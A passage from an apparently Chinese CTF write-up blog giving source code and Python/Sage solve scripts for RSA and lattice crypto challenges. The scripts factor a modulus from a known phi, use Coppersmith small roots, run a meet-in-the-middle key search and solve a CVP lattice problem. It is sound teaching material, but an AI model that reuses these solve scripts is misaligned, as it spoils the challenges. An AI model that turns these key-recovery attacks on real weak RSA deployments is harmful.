class="number">3</span>*x^<span class="number">276</span> - x^<span class="number">275</span> - <span class="number">4</span>*x^<span class="number">274</span> - <span class="number">3</span>*x^<span class="number">273</span> - <span class="number">5</span>*x^<span class="number">272</span> - <span class="number">2</span>*x^<span class="number">271</span> - <span class="number">3</span>*x^<span class="number">270</span> + <span class="number">2</span>*x^<span class="number">269</span> + <span class="number">2</span>*x^<span class="number">268</span> - x^<span class="number">267</span> - <span class="number">2</span>*x^<span class="number">266</span> + x^<span class="number">265</span> + x^<span class="number">264</span> - <span class="number">3</span>*x^<span class="number">262</span> - <span class="number">3</span>*x^<span class="number">259</span> + <span class="number">2</span>*x^<span class="number">258</span> - x^<span class="number">257</span> + <span class="number">2</span>*x^<span class="number">256</span> + <span class="number">2</span>*x^<span class="number">255</span> - x^<span class="number">254</span> - <span class="number">2</span>*x^<span class="number">253</span> - x^<span class="number">252</span> + <span class="number">2</span>*x^<span class="number">251</span> - x^<span class="number">250</span> + x^<span class="number">249</span> + <span class="number">2</span>*x^<span class="number">247</span> + <span class="number">2</span>*x^<span class="number">246</span> + <span class="number">2</span>*x^<span class="number">245</span> - <span class="number">2</span>*x^<span class="number">244</span> - <span class="number">3</span>*x^<span class="number">243</span> + <span class="number">2</span>*x^<span class="number">242</span> - <span class="number">3</span>*x^<span class="number">241</span> - x^<span class="number">240</span> - <span class="number">3</span>*x^<span class="number">239</span> - x^<span class="number">236</span> - <span class="number">3</span>*x^<span class="number">235</span> - <span class="number">2</span>*x^<span class="number">234</span> - x^<span class="number">233</span> - <span class="number">2</span>*x^<span class="number">232</span> - x^<span class="number">231</span> - <span class="number">3</span>*x^<span class="number">230</span> - <span class="number">2</span>*x^<span class="number">229</span> - <span class="number">4</span>*x^<span class="number">228</span> - <span class="number">2</span>*x^<span class="number">227</span> - <span class="number">3</span>*x^<span class="number">226</span> + <span class="number">2</span>*x^<span class="number">225</span> + x^<span class="number">224</span> - x^<span class="number">223</span> - <span class="number">2</span>*x^<span class="number">221</span> + <span class="number">3</span>*x^<span class="number">219</span> - x^<span class="number">217</span> - <span class="number">2</span>*x^<span class="number">216</span> + x^<span class="number">215</span> + <span class="number">2</span>*x^<span class="number">213</span> - x^<span class="number">212</span> + <span class="number">3</span>*x^<span class="number">211</span> + x^<span class="number">210</span> + <span class="number">4</span>*x^<span class="number">209</span> + x^<span class="number">208</span> - x^<span class="number">206</span> - x^<span class="number">205</span> - x^<span class="number">204</span> + <span class="number">2</span>*x^<span class="number">203</span> - <span class="number">3</span>*x^<span class="number">202</span> + <span class="number">2</span>*x^<span class="number">199</span> - x^<span class="number">198</span> + <span class="number">2</span>*x^<span class="number">196</span> - <span class="number">2</span>*x^<span class="number">195</span> + <span class="number">3</span>*x^<span class="number">194</span> + <span class="number">3</span>*x^<span class="number">193</span> - x^<span class="number">192</span> + <span class="number">4</span>*x^<span class="number">191</span> + <span class="number">2</span>*x^<span class="number">189</span> + x^<span class="number">186</span> - x^<span class="number">185</span> - x^<span class="number">184</span> + <span class="number">3</span>*x^<span class="number">183</span> + x^<span class="number">182</span> + <span class="number">2</span>*x^<span class="number">181</span> - <span class="number">2</span>*x^<span class="number">180</span> + x^<span class="number">177</span> + x^<span class="number">175</span> - x^<span class="number">173</span> + <span class="number">3</span>*x^<span class="number">172</span> + x^<span class="number">170</span> + x^<span class="number">169</span> - x^<span class="number">167</span> - <span class="number">2</span>*x^<span class="number">166</span> - x^<span class="number">165</span> - <span class="number">4</span>*x^<span class="number">164</span> - <span class="number">2</span>*x^<span class="number">163</span> + <span class="number">2</span>*x^<span class="number">162</span> + <span class="number">4</span>*x^<span class="number">161</span> - <span class="number">2</span>*x^<span class="number">160</span> - <span class="number">3</span>*x^<span class="number">159</span> - <span class="number">2</span>*x^<span class="number">158</span> - <span class="number">2</span>*x^<span class="number">157</span> + x^<span class="number">156</span> - x^<span class="number">155</span> + <span class="number">3</span>*x^<span class="number">154</span> - <span class="number">4</span>*x^<span class="number">153</span> + x^<span class="number">151</span> + <span class="number">2</span>*x^<span class="number">150</span> + x^<span class="number">149</span> - x^<span class="number">148</span> + <span class="number">2</span>*x^<span class="number">147</span> + <span class="number">3</span>*x^<span class="number">146</span> + <span class="number">2</span>*x^<span class="number">145</span> - <span class="number">4</span>*x^<span class="number">144</span> - <span class="number">4</span>*x^<span class="number">143</span> + x^<span class="number">142</span> - <span class="number">2</span>*x^<span class="number">140</span> - <span class="number">2</span>*x^<span class="number">139</span> + <span class="number">2</span>*x^<span class="number">138</span> + <span class="number">3</span>*x^<span class="number">137</span> + <span class="number">3</span>*x^<span class="number">136</span> + <span class="number">3</span>*x^<span class="number">135</span> + x^<span class="number">134</span> - x^<span class="number">133</span> + <span class="number">2</span>*x^<span class="number">132</span> + <span class="number">3</span>*x^<span class="number">130</span> - <span class="number">3</span>*x^<span class="number">129</span> - <span class="number">2</span>*x^<span class="number">128</span> - x^<span class="number">127</span> - <span class="number">2</span>*x^<span class="number">126</span> + x^<span class="number">125</span> + x^<span class="number">124</span> - <span class="number">2</span>*x^<span class="number">123</span> + x^<span class="number">122</span> - x^<span class="number">121</span> + <span class="number">3</span>*x^<span class="number">120</span> - x^<span class="number">119</span> - <span class="number">2</span>*x^<span class="number">118</span> - x^<span class="number">117</span> - x^<span class="number">116</span> - <span class="number">2</span>*x^<span class="number">115</span> + <span class="number">2</span>*x^<span class="number">114</span> + <span class="number">2</span>*x^<span class="number">113</span> - <span class="number">3</span>*x^<span class="number">112</span> - x^<span class="number">111</span> - <span class="number">4</span>*x^<span class="number">110</span> + x^<span class="number">109</span> + x^<span class="number">108</span> + x^<span class="number">106</span> - <span class="number">4</span>*x^<span class="number">105</span> + x^<span class="number">104</span> - x^<span class="number">103</span> - x^<span class="number">101</span> + x^<span class="number">100</span> - <span class="number">2</span>*x^<span class="number">99</span> + x^<span class="number">98</span> - x^<span class="number">97</span> + <span class="number">3</span>*x^<span class="number">96</span> + <span class="number">3</span>*x^<span class="number">94</span> - x^<span class="number">93</span> - x^<span class="number">92</span> + x^<span class="number">91</span> - <span class="number">2</span>*x^<span class="number">90</span> + x^<span class="number">89</span> - x^<span class="number">88</span> + x^<span class="number">87</span> - x^<span class="number">86</span> + x^<span class="number">85</span> + x^<span class="number">84</span> - x^<span class="number">83</span> + x^<span class="number">79</span> - <span class="number">3</span>*x^<span class="number">78</span> - <span class="number">2</span>*x^<span class="number">77</span> + x^<span class="number">74</span> + <span class="number">3</span>*x^<span class="number">73</span> - x^<span class="number">72</span> - <span class="number">3</span>*x^<span class="number">71</span> - <span class="number">2</span>*x^<span class="number">70</span> + x^<span class="number">69</span> - <span class="number">3</span>*x^<span class="number">66</span> + x^<span class="number">65</span> + x^<span class="number">64</span> - <span class="number">4</span>*x^<span class="number">62</span> - x^<span class="number">61</span> + x^<span class="number">60</span> - x^<span class="number">59</span> + <span class="number">3</span>*x^<span class="number">58</span> - x^<span class="number">57</span> - x^<span class="number">54</span> + <span class="number">3</span>*x^<span class="number">53</span> + x^<span class="number">51</span> - <span class="number">3</span>*x^<span class="number">50</span> - x^<span class="number">49</span> + <span class="number">2</span>*x^<span class="number">47</span> - x^<span class="number">46</span> - x^<span class="number">44</span> + x^<span class="number">43</span> - x^<span class="number">42</span> - <span class="number">4</span>*x^<span class="number">41</span> - <span class="number">3</span>*x^<span class="number">39</span> - x^<span class="number">37</span> - x^<span class="number">36</span> - <span class="number">3</span>*x^<span class="number">35</span> + x^<span class="number">34</span> + x^<span class="number">33</span> - <span class="number">2</span>*x^<span class="number">32</span> + <span class="number">2</span>*x^<span class="number">31</span> - x^<span class="number">30</span> + <span class="number">2</span>*x^<span class="number">29</span> - <span class="number">2</span>*x^<span class="number">28</span> - <span class="number">2</span>*x^<span class="number">27</span> - x^<span class="number">24</span> + x^<span class="number">22</span> - <span class="number">5</span>*x^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">19</span> - x^<span class="number">18</span> + <span class="number">2</span>*x^<span class="number">17</span> + x^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">15</span> - <span class="number">2</span>*x^<span class="number">14</span> + x^<span class="number">13</span> + x^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">5</span> - <span class="number">4</span>*x^<span class="number">4</span> + x^<span class="number">3</span> - x^<span class="number">2</span> - <span class="number">1</span></span><br><span class="line">p = GCD(w-<span class="built_in">pow</span>(<span class="number">2</span>,<span class="built_in">int</span>(f%(x-<span class="number">1</span>),n),n))</span><br><span class="line"><span class="comment"># p = GCD(w * pow(2, -f(1), n) - 1, n)</span></span><br><span class="line">q = n // p</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p>$f\%(x-1)，这一看，sage还是太强大了$</p><h2 id="baby-factor-revenge"><a href="#baby-factor-revenge" class="headerlink" title="baby_factor_revenge"></a>baby_factor_revenge</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">    pl  = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        pl.append(getPrime(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(pl)</span><br><span class="line">pl = create()</span><br><span class="line">m=<span class="string">b&#x27;NSSCTF&#123;xxxxxx&#125;&#x27;</span></span><br><span class="line">p,q,r = pl[<span class="number">0</span>],pl[<span class="number">1</span>],pl[<span class="number">2</span>]</span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi_2=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">n2=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(m),e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;phi=<span class="subst">&#123;phi&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line"><span class="string">phi=3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line"><span class="string">c=8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>脚本源自<a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py</a><br>(原来这个仓库早在<code>SHCTF2024-week4</code>就已经在题目中告诉我们了)</p><p>参考题目<code>NKCTF2023-ez_rsa</code>，<code>Google</code>搜<code>attack phi n</code>即可往下找到，作者的<code>github仓库</code>还有好多<code>attack脚本</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method only works for a modulus consisting of 2 primes!</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors, or None if the factors were not found</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = N + <span class="number">1</span> - phi</span><br><span class="line">    d = s ** <span class="number">2</span> - <span class="number">4</span> * N</span><br><span class="line">    p = <span class="built_in">int</span>(s - isqrt(d)) // <span class="number">2</span></span><br><span class="line">    q = <span class="built_in">int</span>(s + isqrt(d)) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factorize_multi_prime</span>(<span class="params">N, phi</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors from a modulus if Euler&#x27;s totient is known.</span></span><br><span class="line"><span class="string">    This method works for a modulus consisting of any number of primes, but is considerably be slower than factorize.</span></span><br><span class="line"><span class="string">    More information: Hinek M. J., Low M. K., Teske E., &quot;On Some Attacks on Multi-prime RSA&quot; (Section 3)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param phi: Euler&#x27;s totient, the order of the multiplicative group modulo N</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    prime_factors = <span class="built_in">set</span>()</span><br><span class="line">    factors = [N]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(factors) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Element to factorize.</span></span><br><span class="line">        N = factors[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        w = randrange(<span class="number">2</span>, N - <span class="number">1</span>)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> phi % (<span class="number">2</span> ** i) == <span class="number">0</span>:</span><br><span class="line">            sqrt_1 = <span class="built_in">pow</span>(w, phi // (<span class="number">2</span> ** i), N)</span><br><span class="line">            <span class="keyword">if</span> sqrt_1 &gt; <span class="number">1</span> <span class="keyword">and</span> sqrt_1 != N - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># We can remove the element to factorize now, because we have a factorization.</span></span><br><span class="line">                factors = factors[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                p = gcd(N, sqrt_1 + <span class="number">1</span>)</span><br><span class="line">                q = N // p</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(p):</span><br><span class="line">                    prime_factors.add(p)</span><br><span class="line">                <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(p)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> is_prime(q):</span><br><span class="line">                    prime_factors.add(q)</span><br><span class="line">                <span class="keyword">elif</span> q &gt; <span class="number">1</span>:</span><br><span class="line">                    factors.append(q)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Continue in the outer loop</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(prime_factors)</span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    n=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">    phi=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line">    c=<span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">    fac = factorize_multi_prime(n, phi)</span><br><span class="line">    p,q,r=<span class="built_in">sorted</span>(fac)</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p>没想到这题居然还可以用<strong>coppersmith attack</strong>，长见识了，还得是<strong>xm爷</strong></p><p>$s\equiv c^{d}\ mod\ n_{1}\equiv m^{e*d}\ mod\ n_{2}\ mod\ n_{1}\equiv m\ mod\ n_{2}\ mod\ n_{1}$</p><p>同时呢，<code>m</code>肯定是比<code>n1,n2</code>小的，看完<code>exp</code>，怎么说呢，有点似懂非懂(我这里写的思路也不一定对哦)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = </span><br><span class="line">phi = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">s = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x-s</span><br><span class="line">res = f.small_roots(x=<span class="number">2</span>^<span class="number">2048</span>,beta = <span class="number">0.4</span>, epsilon = <span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id="MIMT-RSA"><a href="#MIMT-RSA" class="headerlink" title="MIMT_RSA"></a>MIMT_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY， flag  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">ck = <span class="built_in">pow</span>(KEY, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ck = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">ck = 8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>中间相遇攻击</strong>，原理不难，36位的非素数，随便测了几个数字，大致可以分解为18和20位的两个数字</p><p>参考<a href="https://tangcuxiaojikuai.xyz/post/601c0957.html">https://tangcuxiaojikuai.xyz/post/601c0957.html</a>，<strong>NCTF2021-rsa</strong>，这题还是挺有意思的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line">S = &#123;<span class="built_in">pow</span>(i,-e,n):i <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">20</span>))&#125;</span><br><span class="line">inv_ck = inverse(ck,n)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    s = inv_ck*(<span class="built_in">pow</span>(j,e,n))%n</span><br><span class="line">    <span class="keyword">if</span>(s <span class="keyword">in</span> S):</span><br><span class="line">        secret = S[s]*j</span><br><span class="line">        flag = <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="baby-lattice"><a href="#baby-lattice" class="headerlink" title="baby_lattice"></a>baby_lattice</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">miku = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">key = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> key&gt; p:</span><br><span class="line">    key= getPrime(<span class="number">512</span>)</span><br><span class="line">ts = []</span><br><span class="line">gs = []</span><br><span class="line">zs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(miku):</span><br><span class="line">    t = getPrime(<span class="number">512</span>)</span><br><span class="line">    z = getPrime(<span class="number">400</span>)</span><br><span class="line">    g= (t * key + z) % p</span><br><span class="line">    ts.append(t)</span><br><span class="line">    gs.append(g)</span><br><span class="line">    zs.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ts = <span class="subst">&#123;ts&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gs = <span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">iv= os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">ciphertext=cipher.encrypt(pad(flag.encode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;iv=<span class="subst">&#123;iv&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ciphertext=<span class="subst">&#123;ciphertext&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下面参考的是<strong>小鸡块师傅</strong>的<strong>CVP</strong>做法，<a href="https://tangcuxiaojikuai.xyz/post/6a2afd81.html">https://tangcuxiaojikuai.xyz/post/6a2afd81.html</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">ts = [<span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>, <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>, <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>, <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>, <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>, <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>, 